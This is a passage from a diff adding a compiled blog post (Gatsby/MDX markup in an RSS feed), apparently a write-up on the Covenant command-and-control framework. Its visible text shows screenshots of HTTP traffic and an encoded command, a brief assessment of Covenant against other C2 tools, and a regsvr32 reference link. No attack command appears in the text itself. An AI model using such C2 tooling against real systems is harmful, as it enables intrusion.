+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAABJ0AAASdAHeZh94AAABdUlEQVQoz12Pa1OCQBSG+f9/pvKaWtmoKeAooIKIoHIVBNQcpyS1t8Pqpz48c97dc84zu5yZmpiGU+iRDiOeQVtrsLYWYbKsBhrrzRMDZjqH9+VinflYn/6RBfCONriBs0Nb99E1Q/TMCLy1geQdIPkHCIsYzYmNd9VBxwioF0FLMsz3Vxi7Cwyqs+2ZoRNGfAYn+SZ6lgpxpYNfahBtHeNoRSwhLKdo6TLaMwV9e4aBa0IOVlBjl/oOY3HcMKxjhMVnCk7d1zAMi1CSCia7Z4zSKuS4jEXWhBSVIHiP6AcF9P0n8M4DOw/Wt3OefXTgMVpwMxmctn+DtMlFdUy2LxinDcoNWKcWiWu0WCZBBYOwyvKQqrypQYnrdF+FffkgGU90Yf+McuErDVdo+SZVkhrLuXAYVSG4RYheiWQl9JwCCStsJp/N5Tdhjwmdi3gX0gsUes0oqbOaY3232ILgkNAtkbRMXy6yOzaT3IXnm9D9Ja48/gBBhu/E9xgU6QAAAABJRU5ErkJggg==&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/5220c523646208697ab06ddf88fd8e9b/fe160/http_traffic.webp 1896w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1896px) 100vw, 1896px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/5220c523646208697ab06ddf88fd8e9b/57a56/http_traffic.png 1896w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1896px) 100vw, 1896px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/5220c523646208697ab06ddf88fd8e9b/57a56/http_traffic.png&quot;,
+    &quot;alt&quot;: &quot;http-traffic&quot;,
+    &quot;title&quot;: &quot;http-traffic&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;p&quot;, null, &quot;Upon noticing this you followed the http stream you would notice this.&quot;), mdx(&quot;p&quot;, null, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;1239px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;69.65294592413237%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAABJ0AAASdAHeZh94AAABtElEQVQ4y6VTa0/DMAzs//9T09Y0TQds05BA60BIsHUPoAWExniMw5fEK9s3RKVTEjs+n+00mVy/YFa9onl+R/20xUP9hs32Cx9fO7x//h1JtdxiWjZYrzdomi12u2/850vOL2qcna1QFEuMx/eYThtMrxqUZVj9OaIsa0wmNS4vH/2etivelZX2m5tnJLZYIMvmyPMKvd4dut2AXm8GI3ZCbWk6O9gTxszjfo7+yRKJ6y/hhIyEdOaugrVzn0QT6Zl+tRF6x7kFrKyDwQpJLgp9gMDaSkpvFWdCQNU806ckxgT1JKI6+mhn6zwhL7BElhIyxsCoigmVjCtJvLooQpUPR+tQ8nEpNgbvAyOonopTSU51FEJCotO5xXAohFkkOQ4OPQ2Np3r1M7nvdYwhmZNEPO8JWZJeCkNo+2VjAj91E8p0LtyhSh0m7Z7Q9zANTVZ15vcQbBjCIXH7XEwcUldaMRiugkJtfDu1QJiadoJaoqrRvivoOz2Vd5jFpjKzPpV9oAnZ9dkolGBvi6T+2dhCDrkoKKoAJ8Eu2mR1/Ur+gIX30e6KyoPnzM78nne5jsZr/ADtr9kuj/+ORQAAAABJRU5ErkJggg==&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/a969e078f7a9d5d4959286f79ca13bda/c34b5/long-command.webp 1239w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1239px) 100vw, 1239px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/a969e078f7a9d5d4959286f79ca13bda/be8a4/long-command.png 1239w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1239px) 100vw, 1239px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/a969e078f7a9d5d4959286f79ca13bda/be8a4/long-command.png&quot;,
+    &quot;alt&quot;: &quot;encoded-command&quot;,
+    &quot;title&quot;: &quot;encoded-command&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;take-aways&quot;
+  }, &quot;Take Aways&quot;), mdx(&quot;p&quot;, null, &quot;Although Covenant may seem somewhat limited in what it can\ndo compared to other C2\u2019s such as Powershell Empire\nor Pupy. You have to keep in mind this came out about in February,\nregardless Covenant can already do a lot and comes with a vast amount\nof rich features that are hard to ignore.\nOverall Covenant is a solid choice for a C2 framework.&quot;), mdx(&quot;p&quot;, null, &quot;References:&quot;), mdx(&quot;p&quot;, null, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;Regsvr32 Info&quot;)));
+}
+;
+MDXContent.isMDXComponent = true;</content:encoded></item></channel></rss>
